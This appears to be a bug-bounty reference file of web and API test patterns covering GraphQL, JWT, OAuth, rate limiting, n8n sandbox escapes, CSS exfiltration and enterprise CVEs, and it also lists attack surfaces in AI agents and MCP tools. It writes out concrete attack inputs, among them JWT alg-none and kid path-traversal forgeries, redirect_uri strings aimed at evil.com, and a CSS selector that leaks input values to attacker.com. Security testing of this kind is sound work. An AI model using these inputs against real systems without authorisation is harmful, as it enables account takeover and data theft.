# Web & API Vulnerability Patterns

Advanced testing patterns for API-specific, GraphQL, JWT, OAuth, and specialized web attack surfaces. Reference file for the vuln-patterns skill.

## Table of Contents

- [Tech Stack Patterns](#tech-stack-patterns)
- [GraphQL](#graphql)
- [JWT (JSON Web Token)](#jwt-json-web-token)
- [OAuth 2.0 / OpenID Connect](#oauth-20--openid-connect)
- [API Rate Limiting & Resource Exhaustion](#api-rate-limiting--resource-exhaustion)
- [AI/Agent Attack Surface Routing](#aiagent-attack-surface-routing)

---

## Tech Stack Patterns

When you know the target's technology, focus your testing:

| Stack | Priority Vulns | Why |
|-------|---------------|-----|
| **Node/Express** | Prototype pollution, SSRF, NoSQL injection | Loose typing, MongoDB common |
| **PHP/Laravel** | SQL injection, file upload, deserialization | Legacy patterns, file handling |
| **Python/Django** | SSTI, SSRF, IDOR | Template engines, URL handling |
| **Ruby/Rails** | Mass assignment, IDOR, SSRF | ActiveRecord patterns, open redirect |
| **Java/Spring** | Deserialization, SSRF, XXE | XML processing, heavy serialization |
| **GraphQL** | IDOR via node queries, introspection, DoS | Query complexity, authorization gaps |
| **REST API** | IDOR, broken auth, rate limiting | Stateless design, ID exposure |
| **SPA (React/Vue/Angular)** | DOM XSS, broken access control, API abuse | Client-side rendering, exposed APIs |
| **WordPress** | Plugin vulns, SQLi, file upload | Plugin ecosystem, legacy code |
| **AWS-hosted** | SSRF → metadata, S3 misconfig, IAM issues | Cloud-specific attack surface |
| **AI/LLM features** | Prompt injection, system prompt leak, output injection, excessive agency, cross-agent privilege escalation | OWASP LLM Top 10 #1 risk; 540% increase in reports; present in 73% of production AI; CVEs in GitHub Copilot (9.6), Cursor (9.8), MS Copilot (9.3); second-order cross-agent injection in ServiceNow Now Assist |
| **AI coding IDEs** | Project file supply chain (hooks, MCP configs, env vars), extension recommendation squatting, legacy browser flaws, workspace trust bypass, pre-trust API exfiltration, unauthenticated local servers | IDEsaster: 30+ vulns, 24 CVEs; Cursor Workspace Trust disabled by default; CVE-2026-21852 pre-trust API key exfil; CVE-2026-22812 OpenCode local server RCE; 94+ Chromium CVEs affecting 1.8M devs |
| **MCP integrations** | Tool poisoning, rug pull attacks, command injection (CVE-2025-6514, CVSS 10.0), eval() epidemic, SDK cross-client leaks, WebSocket hijacking, sandbox/container escape, TypeScript type confusion, cross-system data exfiltration | 8,000+ servers exposed; 30+ CVEs in 60 days; CVE-2026-25049 TS sandbox escape; CVE-2026-27001/27002 OpenClaw sandbox+Docker escape; Adversa AI TOP 25; VulnerableMCP.info tracks CVEs |
| **Agentic AI apps** | Agent goal hijack, tool misuse, privilege escalation, memory poisoning, rogue agents, regex denylist bypass in framework shell tools | OWASP Top 10 for Agentic Applications (Dec 2025); CVE-2026-2256 MS-Agent regex bypass; Gravitee: 88% of orgs had AI agent incidents, 47% unmonitored; compounds with MCP vulns |
| **MCP protocol layer** | Token mismanagement, command injection, supply chain poisoning, tool poisoning, shadow servers, insecure data handling | OWASP MCP Top 10 (2026); 30+ CVEs in 60 days; map findings to MCP01-MCP10 |
| **LLM frameworks** | Serialization injection, unsafe deserialization, prompt cascading through streaming ops | LangGrinch (CVE-2025-68664, CVSS 9.3) in LangChain Core; test serialization paths in LangChain, LlamaIndex, Haystack |
| **Web3/Blockchain** | Reentrancy, access control, oracle manipulation, flash loan attacks | $3B+ in Web3 losses H1 2025; access control flaws caused $953.2M; OWASP Smart Contract Top 10 ranks access control #1 |
| **Hardware/IoT** | Firmware extraction, JTAG/UART access, BLE attacks, default credentials | 88% increase in hardware vulns (Bugcrowd 2025), Samsung paying up to $1M |
| **Identity/Access** | BOLA, BFLA, privilege escalation, session management, OAuth flows | Fastest growing vuln class (HackerOne 2025); organizations shifting rewards here as XSS/SQLi decline |
| **A2A protocol** | Agent identity spoofing, capability forgery, task chain poisoning, trust graph attacks | Google's Agent-to-Agent protocol: east-west traffic bypasses perimeters; 40+ academic threats identified (arXiv:2505.12490); no token lifetime limits |

---

## GraphQL

**What it is:** A query language for APIs that introduces unique attack surface beyond REST.

**Where to look:**
- `/graphql`, `/api/graphql`, `/gql` endpoints
- Introspection queries for schema discovery
- Mutation operations for state changes
- Nested queries for authorization testing

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Introspection | `{__schema{types{name,fields{name}}}}` | Full schema disclosure |
| 2 | Field suggestion | Send typos in field names | Error messages leak valid fields |
| 3 | Batching abuse | Send array of operations `[{query:...},{query:...}]` | Bypass rate limiting |
| 4 | Nested query DoS | Deeply nested relationships `{users{posts{comments{author{posts{...}}}}}}` | Server resource exhaustion |
| 5 | Authorization on nodes | Query node IDs directly: `{node(id:"BASE64_ID"){... on User{email}}}` | Access other users' data |
| 6 | Mutation IDOR | Change IDs in mutation inputs | Modify other users' resources |
| 7 | Alias-based batching | `{a:login(u:"a",p:"1") b:login(u:"a",p:"2") ...}` | Brute force via aliases |
| 8 | Directive injection | `@include`, `@skip` with tautologies | Bypass field-level auth |
| 9 | Subscription abuse | Subscribe to events you shouldn't see | Information disclosure via WebSocket |
| 10 | Fragment injection | Overlapping fragments on union types | Access fields from wrong type |

**Bypasses:**
- If introspection is disabled, try `__type(name:"User"){fields{name}}` for individual types
- Some WAFs don't inspect POST body for GraphQL — try GET with `?query=` parameter
- Use field suggestion errors to enumerate schema without introspection
- Try sending queries as `application/x-www-form-urlencoded` instead of JSON

---

## JWT (JSON Web Token)

**What it is:** Stateless authentication tokens that can be manipulated if improperly validated.

**Where to look:**
- `Authorization: Bearer` headers
- Cookies containing base64-encoded JSON
- Any token with three dot-separated segments

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Algorithm none | Change header `alg` to `none`, remove signature | Token accepted without signature |
| 2 | Algorithm confusion | Change RS256 to HS256, sign with public key as HMAC secret | Forged token accepted |
| 3 | Weak secret | Brute-force HMAC secret (hashcat/jwt_tool) | Forge arbitrary tokens |
| 4 | Missing expiry | Check for `exp` claim | Token valid indefinitely |
| 5 | Expired token | Send expired token | Server doesn't check `exp` |
| 6 | Key ID injection | Inject `kid` header: `../../../dev/null` | Path traversal in key loading |
| 7 | JWK header injection | Embed attacker's JWK in token header | Server uses embedded key |
| 8 | Claim tampering | Change `sub`, `role`, `admin` claims | Privilege escalation |
| 9 | Token reuse | Use token after password change/logout | No token invalidation |
| 10 | Cross-service | Use token from service A on service B | Shared secret, no audience check |
| 11 | JWE-wrapped PlainJWT bypass | If target uses encrypted JWTs (JWE), wrap a PlainJWT (alg=none) inside JWE using server's RSA public key | Signature verification skipped — authenticate as any user including admin (CVE-2026-29000, pac4j-jwt, CVSS 10.0) |

**Tools:** jwt.io (decode), jwt_tool (attack), hashcat mode 16500 (crack)

---

## OAuth 2.0 / OpenID Connect

**What it is:** Authorization framework with complex redirect flows that are frequently misconfigured.

**Where to look:**
- Login flows ("Sign in with Google/GitHub/etc.")
- `/authorize`, `/callback`, `/oauth/token` endpoints
- `redirect_uri`, `state`, `code` parameters

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Open redirect via redirect_uri | Change `redirect_uri` to attacker-controlled domain | Auth code sent to attacker |
| 2 | Subdomain redirect | Set `redirect_uri` to `evil.legitimate.com` | Lax subdomain matching |
| 3 | Path traversal redirect | `redirect_uri=https://legit.com/callback/../evil` | Parser bypass |
| 4 | Missing state | Remove `state` parameter from flow | CSRF on OAuth login |
| 5 | State reuse | Replay a used `state` value | No single-use enforcement |
| 6 | Code reuse | Submit authorization code twice | No single-use enforcement |
| 7 | Scope escalation | Request `scope=admin` or add extra scopes | Elevated access granted |
| 8 | Token leakage | Check referrer headers after redirect | Token in URL fragment leaks |
| 9 | IdP confusion | Mix tokens between identity providers | Cross-IdP authentication bypass |
| 10 | PKCE downgrade | Remove `code_verifier` from token request | Server doesn't enforce PKCE |

**Bypasses for redirect_uri validation:**
- URL encoding: `%2F%2Fevil.com`
- Parameter pollution: `redirect_uri=legit.com&redirect_uri=evil.com`
- Fragment: `redirect_uri=legit.com%23@evil.com`
- Subdomain: `redirect_uri=legit.com.evil.com`
- Path: `redirect_uri=legit.com/callback/../../evil`

---

## API Rate Limiting & Resource Exhaustion

**What it is:** Abusing insufficient rate limiting or resource controls on API endpoints.

**Where to look:**
- Authentication endpoints (login, password reset, 2FA)
- Search and data export endpoints
- Any endpoint that triggers expensive operations

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | No rate limit | Rapid-fire requests to login endpoint | No blocking or throttling |
| 2 | Header bypass | Add `X-Forwarded-For: 127.0.0.1` to reset rate counter | Rate limit bypassed |
| 3 | Case variation | Alternate `user@email.COM` and `user@email.com` | Different rate limit buckets |
| 4 | Endpoint variation | Try `/api/v1/login` vs `/api/v2/login` | Per-path rate limiting |
| 5 | IP rotation bypass | Add varying `X-Originating-IP`, `X-Remote-IP` headers | Trust in client headers |
| 6 | Null byte bypass | Append `%00` to parameters | Different rate limit key |
| 7 | Regex DoS | Send crafted input to regex-heavy endpoints | Response time spike (ReDoS) |
| 8 | Pagination abuse | Request `?page_size=999999` | Full database dump |
| 9 | Parallel requests | Send concurrent requests before rate limit kicks in | Race window exploitation |
| 10 | API key enumeration | Iterate API keys on validation endpoint | No rate limit on key checking |

---

## AI/Agent Attack Surface Routing

The following AI/agent-specific test patterns are maintained in the **ai-mcp-vulns.md** reference to avoid duplication. Load that file when testing these surfaces:

| Attack Surface | Patterns | Reference |
|---|---|---|
| **Agentic Browser Hijacking** | Zero-click agent trigger, file system exfil, credential manager access, extension escalation | `ai-mcp-vulns.md` → Agentic Browser Hijacking |
| **MCP OAuth Bypass** | Missing state param, auth code replay, redirect URI bypass, role confusion | `ai-mcp-vulns.md` → MCP OAuth |
| **AI IDE Configuration** | Workspace trust bypass, rules file backdoor, extension squatting, MCP config injection | `ai-mcp-vulns.md` → AI IDE Configuration |
| **ContextCrush / Doc Supply Chain** | Custom rules injection, library doc poisoning, RAG poisoning, env file exfil | `ai-mcp-vulns.md` → ContextCrush |

For full AI/LLM hunting methodology, see the **ai-hunting** skill.

---

## n8n / Workflow Automation Sandbox Escapes

**What it is:** Exploiting sandbox bypass vulnerabilities in workflow automation platforms (n8n, Make, Zapier) that allow code execution beyond intended boundaries.

**Where to look:**
- Expression evaluation engines in workflow automation tools
- Code node implementations (JavaScript, Python)
- Merge/transform nodes with SQL capabilities
- Git integration nodes
- Any workflow tool allowing user-defined expressions

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | JavaScript `with` statement bypass | Use the deprecated `with` statement to access blocked constructors | Sandbox blocking `constructor.constructor` but allowing `with` statement access (CVE-2026-1470, CVSS 9.9) |
| 2 | TypeScript type confusion | Use destructuring syntax that TypeScript type annotations don't enforce at runtime | Sanitization bypassed because runtime types differ from declared types (CVE-2026-25049, CVSS 9.4) |
| 3 | Python code node escape | In workflow tools with Python execution nodes, test for arbitrary Python execution | Full Python execution on "Internal" configuration instances (CVE-2026-0863, CVSS 8.5) |
| 4 | SQL Query mode file write | In merge/transform nodes with SQL mode, test for arbitrary file system operations | File write outside intended directories via crafted SQL expressions (CVE-2026-25056, CVSS 9.4) |
| 5 | Git Node code injection | In workflow tools with Git integrations, inject code via Git operations | RCE on both self-hosted and cloud instances via Git Node (CVE-2026-21877) |
| 6 | Content-Type confusion | Send requests with unexpected Content-Type to webhook/trigger endpoints | Unauthenticated RCE via Content-Type confusion in form handling (CVE-2026-21858 Ni8mare, CVSS 10.0) |
| 7 | Public webhook + expression chain | Access public-facing webhook endpoint and inject expressions that escape the sandbox | Unauthenticated system command execution via single line of JS (CVE-2026-25049) |
| 8 | Destructuring-based sanitization bypass | Use ES6 destructuring to access blocked objects through reassignment | Bypass of `__proto__` and constructor blocks via destructuring syntax |

**Key principle:** Workflow automation platforms are high-value targets because: (a) they often have public webhook endpoints, (b) expression engines run user-controlled code in sandboxes with known bypass techniques, (c) n8n alone had 8 CVEs in January-February 2026 affecting ~100K instances.

**Tools:** n8n Community Edition (self-hosted for testing), Burp Suite for webhook fuzzing, custom JavaScript payloads for sandbox probing.

---

## CSS-Only Data Exfiltration (CSP Bypass)

**What it is:** Using CSS features (`@import` chaining, `@property` registration, `paint()` worklets) to exfiltrate data without JavaScript — defeating most Content Security Policy configurations.

**Key CVE:** CVE-2026-2441 (Chrome, CVSS 8.8) — actively exploited before patch. Use-after-free in CSS parsing exploited via `@import` chaining with server-side redirect mechanism. Chrome re-evaluated selectors against DOM without full page reload.

**Where to look:**
- Applications relying on CSP to prevent XSS data exfiltration
- Pages with user-controlled CSS (custom themes, style injections, CSS-in-JS)
- Targets where JavaScript-based XSS is blocked but CSS injection is possible

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | CSS `@import` chain | Inject `@import url()` pointing to attacker-controlled server with redirects | Server receives requests with leaked data in URL parameters |
| 2 | `@property` + `paint()` | Register custom CSS property and worklet; check if compositor thread handles memory safely | Crash or unexpected behavior indicating UAF |
| 3 | Attribute selector exfiltration | Use `input[value^="a"] { background: url(attacker.com/?char=a) }` pattern | Character-by-character exfiltration of input values via CSS |
| 4 | CSS-only keylogging | Combine attribute selectors with `@import` to detect keypresses via style changes | Keystroke data leaked without any JavaScript |
| 5 | Font-based exfiltration | Use `@font-face` with `unicode-range` to detect specific characters on page | Selective font loading reveals page content |

**Severity Guidance:** High-Critical when CSP is the primary XSS mitigation. This bypasses JavaScript-based CSP entirely. Report as CSP bypass + data exfiltration chain. Patched in Chrome Feb 13, 2026 — test other browsers for similar issues.

---

## Node.js Permission Model & TLS Bypass

**What it is:** Exploiting flaws in Node.js's experimental permission model and TLS implementation.

**Key CVEs:**
- **CVE-2026-21636**: Permission model bypass via Unix Domain Socket connections — attackers bypass file/network access restrictions entirely
- **CVE-2026-21637**: TLS PSK/ALPN callback exceptions — uncaught exceptions in TLS callbacks cause process crashes (DoS)

**Where to look:**
- Applications running Node.js with `--experimental-permission` flag
- Services using Node.js TLS with PSK or ALPN callbacks
- Any Node.js app relying on the permission model for security boundaries

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | UDS permission bypass | Connect via Unix Domain Socket to bypass permission model restrictions | File/network access without permission grant |
| 2 | TLS PSK callback crash | Send TLS connection with crafted PSK identity that triggers exception in callback | Process crash (DoS) |
| 3 | ALPN callback exception | Connect with ALPN protocol list that triggers unhandled exception | Process crash via TLS negotiation |

**Severity Guidance:** High for permission model bypass (security boundary violation); Medium for TLS DoS (service availability). Permission model bypass is especially impactful when apps rely on it for sandboxing — test any Node.js service that uses `--experimental-permission`.

---

## Critical Infrastructure Authentication & Deserialization

**What it is:** Authentication bypass and Java deserialization RCE in network management interfaces — often CVSS 10.0 with root access.

**Recent examples:**
- **CVE-2026-20079** (Cisco Secure FMC, CVSS 10.0): authentication bypass via improper system process created at boot — allows script execution for root access
- **CVE-2026-20131** (Cisco Secure FMC, CVSS 10.0): Java deserialization RCE via crafted serialized object to management interface — unauthenticated root access
- **CVE-2026-22719** (VMware Aria Operations, CVSS 8.1): command injection during support-assisted migration — actively exploited in the wild (CISA KEV March 3, 2026); root access → full virtual infrastructure compromise
- **CVE-2026-20128/20122** (Cisco Catalyst SD-WAN Manager): actively exploited March 5, 2026 — file overwrite + privilege escalation via API; web shell activity observed
- **CVE-2026-24512** (Kubernetes ingress-nginx, CVSS 8.8): configuration injection via `rules.http.paths.path` leading to RCE and secret disclosure; **ingress-nginx project retiring March 2026** — no future patches for 50% of K8s clusters still using it
- **CVE-2026-20965** (Azure Windows Admin Center): SSO token validation failure — local admin on one managed system can pivot tenant-wide across all Azure VMs and Arc-connected systems

**Where to look:**
- Network management interfaces (firewall management, cloud orchestration, virtualization platforms)
- Java-based management consoles with serialization endpoints
- Migration/upgrade workflows with elevated privileges
- Boot-time processes that create persistent service accounts

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Boot process auth bypass | Identify services started at boot time with improper authentication initialization | Admin access without credentials via race condition or misconfigured startup sequence |
| 2 | Java deser on management interfaces | Send crafted serialized Java objects to management API endpoints (ysoserial payloads) | RCE or unexpected behavior indicating deserialization processing |
| 3 | Migration workflow injection | Test migration/upgrade endpoints for command injection in path/hostname parameters | Command execution during privileged migration operations |
| 4 | Management interface exposure | Check if management interfaces are accessible from untrusted networks | Admin consoles reachable without network segmentation |

**Severity Guidance:** Critical — these patterns consistently yield CVSS 9.8-10.0 with root/admin access. No workarounds exist for many (patching only). These are high-value targets because enterprise customers often delay patching management infrastructure.
